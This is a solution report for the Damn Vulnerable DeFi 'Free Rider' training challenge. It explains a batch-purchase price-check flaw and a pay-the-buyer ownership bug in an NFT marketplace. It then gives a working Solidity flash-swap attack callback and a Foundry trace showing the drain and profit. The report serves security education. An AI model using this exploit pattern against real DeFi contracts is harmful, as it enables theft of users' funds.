# Damn Vulnerable DeFi - Free Rider - Solution Report

## Problem Analysis

### Contract Summary

The challenge involves three main contracts:

1. `FreeRiderNFTMarketplace`: A marketplace for trading NFTs.

   - `offerMany()`: Allows users to offer multiple NFTs for sale.
   - `buyMany()`: Allows users to buy multiple NFTs.
   - `_buyOne()`: Internal function to handle the purchase of a single NFT.

2. `DamnValuableNFT`: An ERC721 token contract representing the NFTs.

   - `safeMint()`: Mints new NFTs to a specified address.

3. `FreeRiderRecoveryManager`: A contract to manage the recovery of NFTs.
   - `onERC721Received()`: Handles the receipt of NFTs and pays out a bounty when all NFTs are received.

### Initial Setup

- 6 NFTs are minted and offered for sale in the marketplace for 15 ETH each.
- The marketplace has an initial balance of 90 ETH.
- The Uniswap V2 pool is set up with 15,000 DVT tokens and 9,000 WETH.
- The player starts with only 0.1 ETH.
- A bounty of 45 ETH is placed in the recovery manager contract.

### Success Criteria

To solve the challenge, the player must:

1. Acquire all 6 NFTs from the marketplace.
2. Transfer the NFTs to the recovery manager.
3. Receive the 45 ETH bounty.
4. End up with a balance greater than the 45 ETH bounty.

The challenge is completed when:

- The recovery manager owner possesses all 6 NFTs.
- The marketplace's NFT offer count is 0 and its balance is less than the initial 90 ETH.
- The player's balance is greater than 45 ETH.
- The recovery manager's balance is 0.

## Vulnerability

The main vulnerability in this challenge lies in the `FreeRiderNFTMarketplace` contract, specifically in the `_buyOne()` function. The vulnerable code is:

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

There are two critical issues in this function:

1. **Incorrect Price Check**: The function only checks if `msg.value` is less than `priceToPay` for a single NFT, even when buying multiple NFTs through `buyMany()`. This allows a buyer to purchase multiple NFTs by only paying for one.

2. **Incorrect Payment Logic**: The function pays the seller after transferring the NFT. However, it uses `_token.ownerOf(tokenId)` to determine the recipient of the payment. At this point, the NFT has already been transferred to the buyer, so the buyer receives the payment instead of the seller.

These vulnerabilities allow an attacker to:

- Purchase all NFTs for the price of one
- Receive the payment for each NFT purchased, essentially getting paid to buy the NFTs

Additionally, the challenge setup provides an opportunity for a flash loan attack using the Uniswap V2 pool, which can be exploited to obtain the initial ETH needed for the attack.

## Attack Method

The attack can be executed in the following steps:

1. **Flash Loan**:

   - Initiate a flash swap from the Uniswap V2 WETH/DVT pair.
   - Borrow 15.1 ETH (15 ETH for one NFT + 0.1 ETH buffer for fees).

2. **Exploit Marketplace**:

   - Call `buyMany()` on the `FreeRiderNFTMarketplace` contract, passing in all 6 NFT IDs.
   - Send only 15 ETH as `msg.value`, exploiting the incorrect price check.
   - Due to the payment logic vulnerability, receive 15 ETH back for each NFT purchased (90 ETH total).

3. **Transfer NFTs**:

   - Transfer all 6 NFTs to the `FreeRiderRecoveryManager` contract.
   - This triggers the `onERC721Received()` function for each NFT.
   - When the last NFT is received, the recovery manager pays out the 45 ETH bounty.

4. **Repay Flash Loan**:

   - Convert the received ETH back to WETH.
   - Repay the flash loan (15.1 ETH plus a small fee).

5. **Profit**:
   - The attacker keeps the remaining ETH as profit (approximately 120 ETH).

This attack method exploits multiple vulnerabilities:

- The marketplace's incorrect price check allows buying all NFTs for the price of one.
- The faulty payment logic results in the attacker being paid for each NFT purchase.
- The flash loan provides the initial capital needed without requiring actual funds.

The end result is that the attacker acquires all NFTs, triggers the recovery process, and profits significantly, all starting with just 0.1 ETH.

## Proof of Concept (PoC)

### Core Implementation

To execute the attack, we create a custom contract called `FreeRiderAttack`. This contract implements the attack strategy and interacts with the Uniswap V2 pair, the marketplace, and the recovery manager.

The attack is executed in the following steps:

1. The `attack()` function is called, which initiates a flash swap from the Uniswap V2 pair.

2. The `uniswapV2Call()` function is then automatically called by Uniswap, where the main attack logic is implemented:

```solidity
function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
    require(msg.sender == address(uniswapPair), "Unauthorized");

    // Unwrap WETH
    weth.withdraw(amount0);

    // Buy NFTs from marketplace
    uint256[] memory tokenIds = new uint256[](6);
    for (uint256 i = 0; i < 6; i++) {
        tokenIds[i] = i;
    }
    marketplace.buyMany{value: 15 ether}(tokenIds);

    // Transfer NFTs to recovery manager
    for (uint256 i = 0; i < 6; i++) {
        nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
    }

    // Calculate repayment amount
    uint256 fee = (amount0 * 3) / 997 + 1;
    uint256 repayAmount = amount0 + fee;

    // Ensure we have enough ETH to repay
    require(address(this).balance >= repayAmount, "Not enough ETH to repay");

    // Wrap ETH to repay flash swap
    weth.deposit{value: repayAmount}();

    // Repay flash swap
    weth.transfer(address(uniswapPair), repayAmount);

    // Transfer remaining ETH to player
    uint256 remainingBalance = address(this).balance;
    if (remainingBalance > 0) {
        payable(player).transfer(remainingBalance);
    }
}
```

This implementation successfully exploits the vulnerabilities in the marketplace contract, acquires all NFTs, triggers the recovery process, and profits from the attack.

### Running Result

```
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [28652] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 0)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4752] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 1)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 1)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4752] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 2)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 2)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4752] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 3)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 3)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4752] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 4)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 4)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [4752] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 5)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 5)
    │   └─ ← [Stop]
    ├─ [621] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [284] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertGt(120054563691073219658 [1.2e20], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
